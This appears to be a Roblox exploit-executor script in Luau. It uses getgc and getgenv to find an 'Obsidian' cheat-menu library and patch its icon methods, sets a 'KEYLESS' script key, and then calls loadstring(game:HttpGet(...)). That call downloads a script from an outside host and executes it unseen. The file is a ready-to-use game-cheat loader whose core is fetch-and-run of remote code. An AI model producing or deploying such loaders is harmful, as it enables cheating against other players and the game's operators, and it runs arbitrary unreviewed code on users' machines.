local iconMethods = {
    "GetCustomIcon",
    "GetIcon"
}--232

local scanT: number = 20

getgenv().SCRIPT_KEY = "KEYLESS"

local env = getgenv()
local getGcFn: any = (type(getgc) == "function" and getgc)
    or (type(env.getgc) == "function" and env.getgc)
    or (debug and type((debug :: any).getgc) == "function" and (debug :: any).getgc)
    or nil

local function blankIcon(): {[string]: any}
    return {
        Url = "rbxassetid://0",
        Image = "rbxassetid://0",
        ImageRectOffset = Vector2.zero,
        ImageRectSize = Vector2.zero,
        IconSize = Vector2.new(0, 0)
    }
end

local function safeResolver(original: any): (...any) -> any
    return function(...): any
        local ok, result = pcall(original, ...)
        if not ok or type(result) ~= "table" then
            return blankIcon()
        end
        if result.Url == nil then
            result.Url = "rbxassetid://0"
        end
        return result
    end
end

local function looksLikeObsidian(obj: any): boolean
    return type(obj) == "table"
        and rawget(obj, "GetCustomIcon") ~= nil
        and rawget(obj, "CreateWindow") ~= nil
end

local function patchLibrary(obj: any)
    for _, method in next, iconMethods do
        local original = rawget(obj, method)
        if type(original) == "function" then
            obj[method] = safeResolver(original)
        end
    end
end

local function eachCandidate(visit: (any) -> ())
    if getGcFn then
        local ok, gc = pcall(getGcFn, true)
        if ok and type(gc) == "table" then
            for _, obj in next, gc do
                visit(obj)
            end
        end
    end
    for _, root in next, {env, shared} do
        if type(root) == "table" then
            for _, obj in next, root do
                visit(obj)
            end
        end
    end
end

local function hardenIconsAsync()
    if not getGcFn then
        warn(`getgc unavailable, using getgenv/shared`)
    end
    local seen: {[any]: true} = setmetatable({}, {__mode = "k"}) :: any
    local deadline = os.clock() + scanT
    while os.clock() < deadline do
        eachCandidate(function(obj)
            if not seen[obj] and looksLikeObsidian(obj) then
                if (pcall(patchLibrary, obj)) then
                    seen[obj] = true
                end
            end
        end)
        task.wait()
    end
end

local function runLoaderAsync()
    local ok, err = pcall(function()
    loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/d001fad72967bebc1f6261a1f79314ee2ac0c52bc6f059f662b557e84b8fba65/download"))()
    end)
    if not ok then
        warn(`loader failed: {err}`)
    end
end

task.spawn(hardenIconsAsync)
task.spawn(runLoaderAsync)